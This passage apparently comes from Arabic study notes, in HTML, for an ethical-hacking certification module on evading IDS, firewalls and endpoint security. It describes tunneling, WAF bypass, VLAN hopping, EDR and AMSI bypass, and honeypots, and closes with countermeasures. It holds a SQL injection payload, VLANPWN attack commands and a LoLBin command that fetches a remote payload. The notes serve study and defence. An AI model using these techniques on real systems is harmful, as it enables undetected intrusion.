+<tr><td>ACK Tunneling</td><td>استغلال الطبيعة الموثوقة عادةً لحزم ACK. يبني اتصال TCP شرعي ثم يحقن حزم ACK تحتوي حمولات خبيثة (Malicious Payloads)</td><td>Hping، Nping</td></tr>
+<tr><td>HTTP Tunneling</td><td>تغليف البيانات داخل حركة HTTP (Port 80) — يعمل لو الشركة عندها Web Server عام على Port 80 غير مُفلتَر على الـ IDS/Firewall</td><td>HTTPort، HTTHost</td></tr>
+<tr><td>SSH Tunneling</td><td>تشفير وتنفيذ Tunnel لكل الحركة من الجهاز المحلي للبعيد لتجنّب ضوابط الأمان المحيطية. يستخدم Local/Remote/Dynamic Port Forwarding</td><td>OpenSSH، Bitvise SSH</td></tr>
+<tr><td>DNS Tunneling</td><td>تضمين بيانات خبيثة داخل حزم DNS (حد 255 بايت للاستعلامات الخارجية) عبر Port 53. يُستخدَم للتواصل بين الجهاز المُخترَق وسيرفر C&C — حتى DNSSEC لا يكشفه</td><td>iodine، dnscat2</td></tr>
+</tbody>
+</table></div>
+
+
+<h4>خطوات HTTP Tunneling بـ HTTPort/HTTHost</h4>
+<div class="step-track">
+<div class="step-item"><div class="step-num">1</div><div class="step-title">تعطيل خدمات IIS</div><div class="step-body"><p>تعطيل IIS Admin Service وWorld Wide Web Publishing Service.</p></div></div>
+<div class="step-item"><div class="step-num">2</div><div class="step-title">تشغيل HTTHost</div><div class="step-body"><p>تشغيله بالإعدادات الافتراضية وإدخال كلمة المرور وتفعيل "Revalidate DNS names" و"Log connections".</p></div></div>
+<div class="step-item"><div class="step-num">3</div><div class="step-title">التحقّق من الـ Listener</div><div class="step-body"><p>التأكد من رسالة "Listener: listening at <IP>:90" في تبويب Application Log.</p></div></div>
+<div class="step-item"><div class="step-num">4</div><div class="step-title">إنشاء Outbound Rule</div><div class="step-body"><p>تفعيل Windows Defender Firewall وإنشاء قاعدة Outbound تحجب الحركة على Port 21.</p></div></div>
+<div class="step-item"><div class="step-num">5</div><div class="step-title">إعداد HTTPort</div><div class="step-body"><p>في تبويب Proxy، إدخال IP لجهاز HTTHost والبورت 90 وكلمة المرور.</p></div></div>
+<div class="step-item"><div class="step-num">6</div><div class="step-title">إضافة Port Mapping</div><div class="step-body"><p>في تبويب Port mapping، إضافة Mapping جديد للنظام الهدف.</p></div></div>
+<div class="step-item"><div class="step-num">7</div><div class="step-title">تشغيل HTTPort</div><div class="step-body"><p>ضغط Start في تبويب Proxy — سيعترض HTTPort طلب FTP ويُنفِّذ Tunnel عبره.</p></div></div>
+<div class="step-item"><div class="step-num">8</div><div class="step-title">الاتصال عبر FTP</div><div class="step-body"><p>فتح Command Prompt وتشغيل <code>ftp 127.0.0.1</code> وإدخال بيانات الدخول — الاتصال يتمّ بتجاوز HTTP Proxy والـ Firewall.</p></div></div>
+</div>
+
+
+<h4>SSH Tunneling — مثال</h4>
+<div class="code-wrap"><span class="code-tag">openSSH — local port forwarding example</span><pre><code>ssh -f user@certifiedhacker.com -L 5000:certifiedhacker.com:25 -N
+
+# -f              تشغيل في الخلفية (Background Mode)
+# -L 5000:host:25 local-port : host : remote-port
+# -N              لا تنفّذ أي أمر على السيرفر البعيد
+</code></pre></div>
+<div class="table-wrap"><table>
+<thead><tr><th>نوع الـ Port Forwarding</th><th>الشرح</th></tr></thead>
+<tbody>
+<tr><td>Local Port Forwarding (LPF)</td><td>يسمح بالوصول للموارد الداخلية غير المتاحة مباشرةً من خارج الشبكة</td></tr>
+<tr><td>Remote Port Forwarding (RPF)</td><td>يسمح بالوصول للتطبيقات المحلية على جانب الهدف أو بيئات التطوير في الشبكة البعيدة</td></tr>
+<tr><td>Dynamic Port Forwarding (DPF)</td><td>ينشئ SOCKS Proxy عبر SSH Tunnel يُوجِّه أي حركة ويصل لخدمات غير مصرَّح بها بشكل غير مكتشَف</td></tr>
+</tbody>
+</table></div>
+
+
+<h3>تقنيات التحايل الأخرى</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>التقنية</th><th>الشرح</th></tr></thead>
+<tbody>
+<tr><td>External Systems</td><td>المهاجم يسرق Session ID وCookies من مستخدم شرعي متصل بنظام خارجي، يصل للشبكة الداخلية ويُصدر أوامر openURL() لإعادة توجيه متصفح الضحية لسيرفره الخبيث</td></tr>
+<tr><td>MITM Attack</td><td>تسميم DNS Server ← المستخدم يطلب موقعًا شرعيًا ← DNS يرجع IP المهاجم ← المستخدم يتصل بسيرفر المهاجم ← المهاجم يعمل Relay للحركة مع الموقع الحقيقي وينفّذ أكواده</td></tr>
+<tr><td>Content Smuggling</td><td>إرسال محتوى يحمل كودًا خبيثًا للمستخدم وخداعه لفتحه. يستخدم Steganography أو Obfuscation لإخفاء الكود في ملفات تبدو شرعية (Email بمرفقات Office أو Executable)</td></tr>
+<tr><td>HTML Smuggling</td><td>حقن كود خبيث في HTML/JavaScript مع إخفائه من Firewalls وWeb Proxies وEmail Gateways. يستغل ميزات HTML5 لإنشاء ملف عند التحميل مباشرةً في المتصفح دون عبور الشبكة</td></tr>
+<tr><td>WAF Bypass — HTTP Header Spoofing</td><td>استخدام <code>X-Forwarded-For</code> لتزوير الـ Headers وإيهام الـ WAF بأن الطلب من الشبكة الداخلية</td></tr>
+<tr><td>WAF Bypass — Blacklist Detection</td><td>تحديد الكلمات المحجوبة واستبدالها بـ Regex وPayloads بديلة. مثال: <code>1 || (select username, pwd from employees where userID = 1001) = 'admin'</code></td></tr>
+<tr><td>WAF Bypass — Fuzzing/Brute-force</td><td>إرسال Payloads على الـ WAF المحلي لتحديد ما يمرّ، باستخدام Wordlists زي Assetnote وSecLists</td></tr>
+<tr><td>WAF Bypass — SSL/TLS Cipher Abuse</td><td>تحديد Ciphers مدعومة من السيرفر لكن غير مدعومة من الـ WAF، واستخدامها للتحايل (sslscan2، abuse-ssl-bypass-waf.py)</td></tr>
+<tr><td>Windows BITS</td><td>استغلال Background Intelligent Transfer Service المستخدَم لتوزيع تحديثات Windows — المؤسسات تتجاهل حركة BITS عادةً. يستخدمه المهاجمون لتشغيل تطبيقات خبيثة أو Backdoor عبر bitsadmin أو API calls</td></tr>
+</tbody>
+</table></div>
+
+
+<h3>تقنيات أخرى لتحايل الـ IDS</h3>
+<ul>
+<li>Insertion Attack</li>
+<li>Evasion</li>
+<li>DoS Attack</li>
+<li>Obfuscating</li>
+<li>False Positive Generation</li>
+<li>Session Splicing</li>
+<li>Unicode Evasion</li>
+<li>Fragmentation Attack</li>
+<li>Time-To-Live Attacks</li>
+<li>Invalid RST Packets</li>
+<li>Urgency Flag</li>
+<li>Polymorphic Shellcode</li>
+<li>ASCII Shellcode</li>
+<li>Application-Layer Attacks</li>
+<li>Desynchronization</li>
+<li>Domain Generation Algorithms (DGA)</li>
+<li>Encryption</li>
+<li>Flooding</li>
+</ul>
+
+
+<!-- LU4 -->
+
+<hr />
+
+<h2 id="lu4"><span class="num">04</span><span class="htext">التحايل على الـ NAC وأمان نقاط النهاية (Endpoint Security)</span></h2>
+
+
+
+<h3>VLAN Hopping</h3>
+<p>أداة <strong>VLANPWN</strong> تحتوي سكربتين:</p>
+<div class="table-wrap"><table>
+<thead><tr><th>السكربت</th><th>الشرح</th></tr></thead>
+<tbody>
+<tr><td>DoubleTagging.py</td><td>يُنفِّذ هجوم VLAN Hopping بحقن إطار بـ 802.1Q tags مزدوجة</td></tr>
+<tr><td>DTPHijacking.py</td><td>يُنفِّذ DTP Switch Spoofing/Hijacking — يُرسِل إطار DTP-Desirable خبيث ويحوّل جهاز المهاجم لـ Trunk Channel</td></tr>
+</tbody>
+</table></div>
+
+<div class="code-wrap"><span class="code-tag">bash — VLANPWN usage</span><pre><code>python3 DoubleTagging.py --interface eth0 --nativevlan 1 --targetvlan 20 --victim &lt;IP&gt; --attacker &lt;IP&gt;
+python3 DTPHijacking.py --interface eth0
+</code></pre></div>
+
+<h3>التحايل على NAC باستخدام Pre-authenticated Device</h3>
+<p>المهاجم يحصل على جهاز مُصادَق مسبقًا ويضع جهازه (مثل Raspberry Pi) بين الجهاز المُصادَق وسيرفر الـ Authentication، مما يضمن مرور الحركة عبر جهازه. أدوات: <strong>nac_bypass_setup.sh</strong>، FENRIR، NACkered، Silentbridge، BITM.</p>
+
+<h3>Ghostwriting</h3>
+<p>تعديل هيكل كود الـ Malware بدون التأثير على وظيفته، عبر Binary Deconstruction وإدراج كود Assembly عشوائي وإعادة التجميع. يتجاوز برامج مكافحة الفيروسات (Signature-based Detection). أداة: <strong>Ghostwriting.sh</strong>.</p>
+
+<h3>Application Whitelisting Bypass</h3>
+<p>الـ Application Whitelisting ميزة أمان في Windows لمنع تنفيذ التطبيقات الخبيثة. التطبيق عند تشغيله يبحث عن DLLs في مسار ملفه. المهاجم يضع DLL خبيث باسم شرعي في نفس المجلد (DLL Hijacking) ← الـ DLL الخبيث يُنفَّذ مع التطبيق لتعطيل أمان الـ Endpoint. يمكن كمان استخدام <code>rundll32.exe</code>، <code>regsvr32.exe</code>، وPowerShell.</p>
+
+<h3>Dechaining Macros</h3>
+<p>التحايل على كشف الـ Endpoint وتعديل الذاكرة والـ Registry وملفات Windows بـ VBScript بأسلوبين:</p>
+<div class="table-wrap"><table>
+<thead><tr><th>الأسلوب</th><th>الشرح</th></tr></thead>
+<tbody>
+<tr><td>Spawning through ShellCOM</td><td>استدعاء أي Object مرتبط بـ COM عبر VBScript لاستخدام وظائفه — مثال: تشغيل <code>calc.exe</code> عبر ShellExecute</td></tr>
+<tr><td>Spawning using XMLDOM</td><td>تنزيل وتشغيل كود داخل عملية Office. يستخدم <code>Microsoft.XMLDOM</code> لتحميل ملف XSL خبيث من سيرفر بعيد وتحويله</td></tr>
+</tbody>
+</table></div>
+
+
+<h3>Clearing Memory Hooks (تجاوز EDR)</h3>
+<div class="step-track">
+<div class="step-item"><div class="step-num">1</div><div class="step-title">تحديد DLLs التطبيق</div><div class="step-body"><p>المهاجم يجد الـ DLLs والدوال المرتبطة والـ Syscalls المُصدَّرة للتطبيق الهدف.</p></div></div>
+<div class="step-item"><div class="step-num">2</div><div class="step-title">تحديد الـ Hooks</div><div class="step-body"><p>يستخدم أدوات مثل <strong>x64dbg</strong> لتحديد الـ Syscalls المُعلَّقة (Hooked) في الذاكرة.</p></div></div>
+<div class="step-item"><div class="step-num">3</div><div class="step-title">إنشاء Payload مُعادِل</div><div class="step-body"><p>يصنع Payload يُعيد كتابة هذه الـ Hooks بالبايتات الأصلية الدقيقة.</p></div></div>
+<div class="step-item"><div class="step-num">4</div><div class="step-title">إزالة الـ EDR Hooks</div><div class="step-body"><p>إعادة تحميل المكان الصحيح في الذاكرة لمحو هوكس الـ EDR.</p></div></div>
+<div class="step-item"><div class="step-num">5</div><div class="step-title">تنفيذ بـ Syscalls مخصَّصة</div><div class="step-body"><p>استخدام Assembly وSyscalls خاصة لتنفيذ Payload الخبيث بدون تفعيل أي EDR Hook.</p></div></div>
+</div>
+
+
+
+<h3>Process Injection</h3>
+<p>حقن كود Malware في مساحة ذاكرة عملية شغّالة — جزء من استراتيجية للاستمرارية (Persistence)، تصعيد الصلاحيات، أو تنفيذ أنشطة خبيثة بدون كشف.</p>
+<div class="step-track">
+<div class="step-item"><div class="step-num">1</div><div class="step-title">VirtualAllocEx()</div><div class="step-body"><p>تخصيص ذاكرة في مساحة عنوان العملية الهدف — المهاجم يحجز كتلة ذاكرة لحقن الـ Payload فيها.</p></div></div>
+<div class="step-item"><div class="step-num">2</div><div class="step-title">WriteProcessMemory()</div><div class="step-body"><p>كتابة البيانات في مساحة ذاكرة العملية البعيدة — المهاجم يكتب الـ Payload الخبيث في الكتلة المحجوزة.</p></div></div>
+<div class="step-item"><div class="step-num">3</div><div class="step-title">CreateRemoteThread()</div><div class="step-body"><p>إنشاء Thread جديد في مساحة عنوان العملية الهدف — يُوجِّهه لتنفيذ الكود المحقون.</p></div></div>
+</div>
+
+
+<h3>LoLBins — Living off the Land Binaries</h3>
+<p>أدوات نظام شرعية مُثبَّتة مسبقًا أو محمَّلة من مصادر موثوقة (Microsoft) تُستخدَم لتجاوز الـ EDR.</p>
+<div class="code-wrap"><span class="code-tag">lolbins — edr bypass via deimos c2</span><pre><code># 1. إعداد Agent في Deimos C2 للتواصل عبر HTTPS
+
+# 2. تنفيذ Windows Binary لتحميل ملف بعيد
+C:/&gt; ConfigSecurityPolicy.exe http://example.com/payload
+
+# 3. صلاحيات User على Windows 10/11
+C:/&gt; CustomShellHost.exe
+</code></pre></div>
+
+<h3>CPL Side-Loading</h3>
+<p>محاكاة وظيفة CPL Applet الأصلية لجعل النشاط الخبيث يبدو شرعيًا — عند تنفيذ ملف CPL شرعي يُحمَّل الكود الخبيث المدمج معه. أنظمة الكشف التقليدية كثيرًا ما تتجاهل ملفات CPL لأنها غير مرتبطة عادةً بالـ Malware. أداة: <strong>CPLResourceRunner</strong>.</p>
+
+<h3>Metasploit Templates Bypass</h3>
+<p>إنشاء Payload خبيث بـ <strong>msfvenom</strong> ← تحليله على VirusTotal لمعرفة معدّل الكشف ← التعديل المتكرّر لـ Metasploit Templates لتقليل معدّل الكشف.</p>
+
+<h3>تجاوز AMSI (Windows Antimalware Scan Interface)</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>التقنية</th><th>الشرح</th></tr></thead>
+<tbody>
+<tr><td>PowerShell Downgrade</td><td>تخفيض إصدار PowerShell لـ 2.0 لتجاوز كشف AMSI (غير مدعوم في الإصدار القديم)</td></tr>
+<tr><td>Obfuscation</td><td>جعل الكود معقّدًا وغير مقروء — تفكيك النصوص وتجميعها بعامل <code>+</code>. أداة <strong>AmsiTrigger</strong> تفحص السكربتات وتحدّد الأسطر المُشغِّلة لـ AMSI</td></tr>
+<tr><td>Forcing an Error</td><td>تعديل دالة <code>amsiInitFailed()</code> لإرجاع Boolean True بدل 0 — يُولِّد خطأ أثناء تهيئة AMSI عبر تخصيص الذاكرة وتعديل قيم في <code>AmsiUtils</code></td></tr>
+<tr><td>Memory Hijacking</td><td>التلاعب بالدوال الداخلية لـ AMSI عبر Hooking دالة <code>AmsiScanBuffer()</code> وإجبارها على إرجاع <code>AMSI_RESULT_CLEAN</code> دائمًا</td></tr>
+</tbody>
+</table></div>
+
+
+<!-- LU5 -->
+
+<hr />
+
+<h2 id="lu5"><span class="num">05</span><span class="htext">مفاهيم الـ Honeypot وكيف تكشفه</span></h2>
+
+
+
+<h3>ما هو الـ Honeypot؟</h3>
+<ul>
+<li>مورد نظام معلوماتي مُعَدّ خصيصًا لجذب واصطياد من يحاول اختراق شبكة المؤسسة</li>
+<li>لا يحتوي أي نشاط مصرَّح به ولا قيمة إنتاجية — أي حركة إليه على الأرجح استطلاع أو هجوم أو اختراق</li>
+<li>يقدر يسجّل محاولات وصول البورتات أو يراقب ضغطات مفاتيح المهاجم — تنبيهات مبكّرة لهجوم أشمل</li>
+</ul>
+
+
+<h3>أنواع الـ Honeypots</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>النوع</th><th>الشرح</th></tr></thead>
+<tbody>
+<tr><td>Low-interaction</td><td>يُحاكي عددًا محدودًا فقط من الخدمات والتطبيقات</td></tr>
+<tr><td>Medium-interaction</td><td>يُحاكي نظام تشغيل حقيقي وتطبيقاته وخدماته</td></tr>
+<tr><td>High-interaction</td><td>يُحاكي كل الخدمات والتطبيقات</td></tr>
+<tr><td>Pure Honeypots</td><td>يُحاكي شبكة الإنتاج الحقيقية للمؤسسة</td></tr>
+<tr><td>Database Honeypots</td><td>قواعد بيانات وهمية معرَّضة لهجمات SQL Injection وDatabase Enumeration</td></tr>
+<tr><td>Spam Honeypots</td><td>سيرفرات بريد تقبل الإيميلات من أي مصدر لاصطياد المرسِلين العشوائيين (Spammers) ورصد نشاطهم</td></tr>
+<tr><td>Spider Honeypots (Spider Traps)</td><td>فخاخ لـ Web Crawlers والـ Spiders. موقع وهمي يُقدَّم كأنه حقيقي — من يحاول Crawling يُحدَّد ويُدرَج في القائمة السوداء</td></tr>
+</tbody>
+</table></div>
+
+<div class="callout note"><div class="callout-label">أدوات Honeypot</div><p>HoneyBOT (Medium-interaction للـ Windows)، Blumira، NeroSwarm Honeypot، Valhala Honeypot، Cowrie، StingBox.</p></div>
+
+
+<!-- LU6 -->
+
+<hr />
+
+<h2 id="lu6"><span class="num">06</span><span class="htext">الإجراءات المضادة لمنع التحايل</span></h2>
+
+
+
+<h3>الدفاع ضد التحايل على الـ Firewall</h3>
+<ol>
+<li>إعداد الـ Firewall بحيث يُفلتَر عنوان IP للمتسلّل</li>
+<li>ضبط مجموعة قواعد الـ Firewall لحجب كل الحركة والسماح فقط بالخدمات المطلوبة</li>
+<li>إن أمكن، إنشاء User ID فريد لتشغيل خدمات الـ Firewall بدل تشغيلها بحساب Administrator أو Root</li>
+<li>إعداد Syslog Server بعيد وتطبيق إجراءات صارمة لحمايته من المستخدمين الخبيثين</li>
+<li>مراقبة سجلات الـ Firewall بانتظام والتحقيق في كل الإدخالات المشبوهة</li>
+<li>تعطيل كل اتصالات FTP الواردة والصادرة من الشبكة بشكل افتراضي</li>
+<li>تشغيل استعلامات مخاطر دورية لتحديد قواعد الـ Firewall الضعيفة</li>
+<li>فهرسة ومراجعة كل الحركة المسموح لها بالدخول والخروج عبر الـ Firewall</li>
+<li>مراقبة وصول المستخدمين للـ Firewall والتحكّم في من يقدر يعدّل إعداداته</li>
+<li>تحديد عناوين IP المصدر والوجهة والبورتات بدقة في القواعد</li>
+<li>إخطار مسؤول السياسة الأمنية بأي تغييرات على الـ Firewall وتوثيقها</li>
+<li>التحكّم في الوصول الفيزيائي للـ Firewall</li>
+<li>أخذ نسخ احتياطية منتظمة لـ Ruleset وملفات إعدادات الـ Firewall</li>
+<li>جدولة تدقيقات أمنية دورية للـ Firewall</li>
+<li>البحث عن HTTPS/TLS Inspection متكامل للدفاع ضد التحايل</li>
+</ol>
+
+<!-- CHEAT -->
+
+<hr />
+
+<h2 id="cheat"><span class="htext">Cheat Sheet مرجعي</span></h2>
+
+
+<div class="cheat-section">
+
+<h4>مقارنة أنواع الـ Firewalls وطبقة OSI</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>النوع</th><th>طبقة OSI</th><th>الميزة الرئيسية</th></tr></thead>
+<tbody>
+<tr><td>Packet Filtering</td><td>L3 — Network</td><td>سريع، يفحص الـ Headers فقط — لا يتتبّع حالة الاتصال</td></tr>
+<tr><td>Circuit-Level Gateway</td><td>L5 — Session</td><td>يتحقّق من مصافحة TCP — لا يفحص محتوى الحزمة</td></tr>
+<tr><td>Application-Level Firewall</td><td>L7 — Application</td><td>أعمق فحص — Proxy لكل بروتوكول على حدة</td></tr>
+<tr><td>Stateful Multilayer Inspection</td><td>L3 + L5 + L7</td><td>يجمع الثلاثة — يحلّل الحالة والمحتوى معًا</td></tr>
+<tr><td>VPN Firewall</td><td>متعدّد</td><td>يُضيف تشفيرًا للاتصالات عبر VPN Tunnel</td></tr>
+</tbody>
+</table></div>
+
+
+<h4>مقارنة تقنيات الـ Tunneling للتحايل</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>النوع</th><th>البروتوكول/البورت</th><th>الأداة</th><th>ملاحظة</th></tr></thead>
+<tbody>
+<tr><td>ICMP Tunneling</td><td>ICMP (Echo)</td><td>ICMPTX</td><td>يخفي Payload في حزم Ping</td></tr>
+<tr><td>ACK Tunneling</td><td>TCP ACK</td><td>Hping، Nping</td><td>يستغل الطابع الموثوق لحزم ACK</td></tr>
+<tr><td>HTTP Tunneling</td><td>TCP 80</td><td>HTTPort، HTTHost</td><td>يعمل لو Port 80 مفتوح بدون فلترة</td></tr>
+<tr><td>SSH Tunneling</td><td>TCP 22</td><td>OpenSSH، Bitvise</td><td>تشفير كامل — Local/Remote/Dynamic PF</td></tr>
+<tr><td>DNS Tunneling</td><td>UDP 53</td><td>iodine، dnscat2</td><td>حد 255 بايت — مخفي وصعب الكشف</td></tr>
+</tbody>
+</table></div>
+
+
+<h4>مقارنة أنواع الـ Honeypots</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>النوع</th><th>مستوى التفاعل</th><th>ما يُحاكيه</th></tr></thead>
+<tbody>
+<tr><td>Low-interaction</td><td>منخفض</td><td>خدمات وتطبيقات محدودة فقط</td></tr>
+<tr><td>Medium-interaction</td><td>متوسط</td><td>نظام تشغيل حقيقي وخدماته</td></tr>
+<tr><td>High-interaction</td><td>مرتفع</td><td>كل الخدمات والتطبيقات</td></tr>
+<tr><td>Pure Honeypot</td><td>حقيقي</td><td>شبكة الإنتاج الكاملة</td></tr>
+<tr><td>Database Honeypot</td><td>متخصَّص</td><td>قاعدة بيانات وهمية للـ SQL Injection</td></tr>
+<tr><td>Spam Honeypot</td><td>متخصَّص</td><td>سيرفر بريد مفتوح لاصطياد الـ Spam</td></tr>
+<tr><td>Spider Trap</td><td>متخصَّص</td><td>موقع وهمي لاصطياد Web Crawlers</td></tr>
+</tbody>
+</table></div>
+
+
+<h4>تقنيات تجاوز AMSI — مرجع سريع</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>التقنية</th><th>الآلية</th></tr></thead>
+<tbody>
+<tr><td>PowerShell Downgrade</td><td><code>powershell -version 2</code> ← AMSI غير متوفّر في v2</td></tr>
+<tr><td>Obfuscation</td><td>تفكيك النصوص وإعادة تجميعها بـ <code>+</code> — AmsiTrigger لتحديد الأسطر المُشغِّلة</td></tr>
+<tr><td>Forcing an Error</td><td>تعديل <code>amsiInitFailed</code> ← True ← AMSI يفشل في التهيئة</td></tr>
+<tr><td>Memory Hijacking</td><td>Hooking <code>AmsiScanBuffer()</code> ← إرجاع <code>AMSI_RESULT_CLEAN</code> دائمًا</td></tr>
+</tbody>
+</table></div>
+
+
+</div>
+
+<!-- SUMMARY -->
+
+<hr />
+
+<h2 id="summary"><span class="htext">الخلاصة العامة للموديول</span></h2>
+
+
+<p>الموديول ده ناقش مفاهيم الـ IDS وIPS والـ Firewall وحلولها، والتقنيات المتنوّعة للتحايل عليها (20 تقنية)، وتقنيات تجاوز الـ NAC وأمان نقاط النهاية. ناقش كمان مفاهيم الـ Honeypot وأنواعه، وختم بإجراءات مضادة تفصيلية لمنع التحايل.</p>
+
+<div class="takeaways">
+<div class="takeaways-title">$ cat ./module12_summary.txt</div>
+<ul>
+<li>الـ IPS هو IDS نشط — الفرق الجوهري إنه يمنع التسلّل بدل الاكتفاء بالكشف عنه</li>
+<li>False Negative هو أخطر أنواع تنبيهات الـ IDS — يحصل تسلّل حقيقي بدون أي إنذار</li>
+<li>Stateful Multilayer Inspection هو الأشمل لأنه يجمع Packet Filtering وCircuit-Level وApplication-Level في مستوى واحد</li>
+<li>الـ Tunneling (ICMP، ACK، HTTP، SSH، DNS) يعتمد على حركة تبدو شرعية للـ Firewall — دائمًا اسأل: هل هذا البروتوكول مُراقَب كمان؟</li>
+<li>LoLBins وProcess Injection خطيران لأنهما يستخدمان أدوات النظام الشرعية نفسها — صعب جدًا كشفهما بـ Signature Detection</li>
+<li>الـ Honeypot لا قيمة إنتاجية له ولا نشاط مصرَّح به — أي حركة إليه مشبوهة تلقائيًا وتستحق التحقيق</li>
+</ul>
+</div>
+
+<blockquote>
+<p><strong>الـ Firewall والـ IDS مش نهاية الدفاع — هما بداية عقلية الطبقات.</strong> المهاجم المتمرّس يعامل كل عائق كمشكلة هندسية: إيجاد بروتوكول موثوق مسموح بمروره وتحويله لـ Tunnel. الدفاع الحقيقي يبدأ من فهم هذه المسارات قبل أن يستغلّها المهاجم.</p>
+</blockquote>
+
+<div class="callout examtip"><div class="callout-label">Exam Tip</div><p>أسئلة هذا الموديول غالبًا تُركِّز على: الفرق بين أنواع تنبيهات الـ IDS الأربعة (True/False Positive/Negative)، أنواع الـ Firewalls وطبقة OSI لكل منها، الفرق بين Firewalking والـ Port Scanning، أنواع الـ Honeypots ومستوى تفاعل كل منها، وDNS Tunneling عبر Port 53 وعلاقته بـ C&C Server.</p></div>
+
+
+<hr />
+<p><em>نهاية نوتس الموديول الثاني عشر — Evading IDS, Firewalls, and Honeypots</em></p>
+<div class="footer-note">-- EOF: module-12/ids-firewall-evasion.md --</div>
+</div>
+
+<script>
+(function(){
+  var root=document.documentElement,btn=document.getElementById('themeSwitch');
+  function applyTheme(t){root.setAttribute('data-theme',t);btn.textContent='theme: '+t;try{localStorage.setItem('oscp-notes-theme',t);}catch(e){}}
+  var saved='dark';try{saved=localStorage.getItem('oscp-notes-theme')||'dark';}catch(e){}
+  applyTheme(saved);
+  btn.addEventListener('click',function(){applyTheme(root.getAttribute('data-theme')==='dark'?'light':'dark');});
+  var bar=document.getElementById('progressBar');
+  function onScroll(){var h=document.documentElement,s=h.scrollTop,ht=h.scrollHeight-h.clientHeight;bar.style.width=(ht>0?(s/ht*100):0)+'%';var t=document.getElementById('toTop');s>500?t.classList.add('show'):t.classList.remove('show');}
+  document.addEventListener('scroll',onScroll);onScroll();
+  document.getElementById('toTop').addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+  document.querySelectorAll('.code-wrap').forEach(function(wrap){
+    var c=wrap.querySelector('code');if(!c)return;
+    var b=document.createElement('button');b.className='copy-btn';b.textContent='copy';
+    b.addEventListener('click',function(){if(navigator.clipboard){navigator.clipboard.writeText(c.innerText).then(function(){b.textContent='copied ✓';b.classList.add('copied');setTimeout(function(){b.textContent='copy';b.classList.remove('copied');},1500);});}});
+    wrap.appendChild(b);
+  });
+})();
+</script>
+</body>
+</html>
